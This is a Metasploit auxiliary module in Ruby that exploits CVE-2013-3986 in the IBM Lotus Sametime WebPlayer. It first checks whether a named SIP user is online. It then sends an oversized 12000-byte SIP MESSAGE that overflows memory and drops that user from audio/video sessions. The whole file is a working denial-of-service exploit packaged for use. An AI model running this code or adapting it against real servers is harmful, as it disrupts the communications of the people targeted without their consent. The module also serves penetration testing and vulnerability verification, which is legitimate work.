##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'       => 'IBM Lotus Sametime WebPlayer DoS',
      'Description'  => %q{
        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
        version 8.5.2.1392 (and prior) to cause a denial of service condition
        against specific users. For this module to function the target user
        must be actively logged into the IBM Lotus Sametime server and have
        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
        browser extension. The user should have the WebPlayer plug-in active
        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
      },
      'Author'     =>
        [
          'Chris John Riley', # Vulnerability discovery
          'kicks4kittens' # Metasploit module
        ],
      'License'    => MSF_LICENSE,
      'Actions'    =>
        [
          ['DOS',
            {
              'Description' => 'Cause a Denial Of Service condition against a connected user'
            }
          ],
          ['CHECK',
            {
              'Description' => 'Checking if targeted user is online'
            }
          ]
        ],
      'DefaultAction'  => 'DOS',
      'References'   =>
        [
          [ 'CVE', '2013-3986' ],
          [ 'OSVDB', '99552' ],
          [ 'BID', '63611'],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
          [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
        ],
      'DisclosureDate' => 'Nov 07 2013'))

    register_options(
      [
        Opt::RPORT(5060),
        OptAddress.new('RHOST', [true, 'The Sametime Media Server']),
        OptString.new('SIPURI', [
          true,
          'The SIP URI of the user to be targeted',
          '<target_email_address>@<sametime_media_server_FQDN>'
        ]),
        OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
      ], self.class)

  end

  def setup
    # cleanup SIP target to ensure it's in the correct format to use
    @sipuri = datastore['SIPURI']
    if @sipuri[0, 4].downcase == "sip:"
      # remove sip: if present in string
      @sipuri = @sipuri[4, @sipuri.length]
    end
    if @sipuri[0, 12].downcase == "webavclient-"
      # remove WebAVClient- if present in string
      @sipuri = @sipuri[12, @sipuri.length]
    end
  end

  def run
    # inform user of action currently selected
    print_status("#{peer} - Action: #{action.name} selected")

    # CHECK action
    if action.name == 'CHECK'
      print_status("#{peer} - Checking if user #{@sipuri} is online")
      if check_user
        print_status("#{peer} - User online")
      else
        print_status("#{peer} - User offline")
      end
      return
    end

    # DOS action
    print_status("#{peer} - Checking if user #{@sipuri} is online")
    check_result = check_user

    if check_result == false
      print_error("#{peer} - User is already offline... Exiting...")
      return
    end

    # only proceed if action is DOS the target user is
    # online or the CHECKUSER option has been disabled
    print_status("#{peer} - Targeting user: #{@sipuri}...")
    dos_result = dos_user

    if dos_result
      print_good("#{peer} - User is offline, DoS was successful")
    else
      print_error("#{peer} - User is still online")
    end

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def dos_user
    length = 12000 # enough to overflow the end of allocated memory
    msg = create_message(length)
    res = send_msg(msg)

    if res.nil?
      vprint_good("#{peer} - User #{@sipuri} is no responding")
      return true
    elsif res =~ /430 Flow Failed/i
      vprint_good("#{peer} - DoS packet successful. Response received (430 Flow Failed)")
      vprint_good("#{peer} - User #{@sipuri} is no longer responding")
      return true
    elsif res =~ /404 Not Found/i
      vprint_error("#{peer} - DoS packet appears successful. Response received (404 Not Found)")
      vprint_status("#{peer} - User appears to be currently offline or not in a Sametime video session")
      return true
    elsif res =~ /200 OK/i
      vrint_error("#{peer} - DoS packet unsuccessful. Response received (200)")
      vrint_status("#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer")
      return false
    else
      vprint_status("#{peer} - Unexpected response")
      return true
    end
  end

  # used to check the user is logged into Sametime and after DoS to check success
  def check_user
    length = Rex::Text.rand_text_numeric(2) # just enough to check response
    msg = create_message(length)
    res = send_msg(msg)

    # check response for current user status - common return codes
    if res.nil?
      vprint_error("#{peer} - No response")
      return false
    elsif res =~ /430 Flow Failed/i
      vprint_good("#{peer} - User #{@sipuri} is no longer responding (already DoS'd?)")
      return false
    elsif res =~ /404 Not Found/i
      vprint_error("#{peer} - User #{@sipuri} is currently offline or not in a Sametime video session")
      return false
    elsif res =~ /200 OK/i
      vprint_good("#{peer} - User #{@sipuri} is online")
      return true
    else
      vprint_error("#{peer} - Unknown server response")
      return false
    end
  end

  def create_message(length)
    # create SIP MESSAGE of specified length
    vprint_status("#{peer} - Creating SIP MESSAGE packet #{length} bytes long")

    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
    source_host = Rex::Socket.source_address(datastore['RHOST'])
    src = "#{source_host}:#{datastore['RPORT']}"
    cseq = Rex::Text.rand_text_numeric(3)
    message_text = Rex::Text.rand_text_alphanumeric(length.to_i)
    branch = Rex::Text.rand_text_alphanumeric(7)

    # setup SIP message in the correct format expected by the server
    data =  "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
    data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
    data << "Max-Forwards: 80\r\n"
    data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
    data << "From: sip:#{source_user}@#{src};tag=70c00e8c" + "\r\n"
    data << "Call-ID: #{rand(0x100000000)}@#{source_host}" + "\r\n"
    data << "CSeq: #{cseq} MESSAGE" + "\r\n"
    data << "Content-Type: text/plain;charset=utf-8" + "\r\n"
    data << "User-Agent: #{source_user}\r\n"
    data << "Content-Length: #{message_text.length}" + "\r\n\r\n"
    data << message_text

    return data
  end

  def timing_get_once(s, length)
    if datastore['TIMEOUT'] and datastore['TIMEOUT'] > 0
      return s.get_once(length, datastore['TIMEOUT'])
    else
      return s.get_once(length)
    end
  end

  def send_msg(msg)
    begin
      s = connect
      # send message and store response
      s.put(msg + "\r\n\r\n") rescue nil
      # read response
      res = timing_get_once(s, 25)
      if res == "\r\n"
        # retry request
        res = timing_get_once(s, 25)
      end
      return res
    rescue ::Rex::ConnectionRefused
      print_status("#{peer} - Unable to connect")
      return nil
    rescue ::Errno::ECONNRESET
      print_status("#{peer} - DoS packet successful, host not responding.")
      return nil
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_status("#{peer} - Couldn't connect")
      return nil
    ensure
      # disconnect socket if still open
      disconnect if s
    end
  end
end
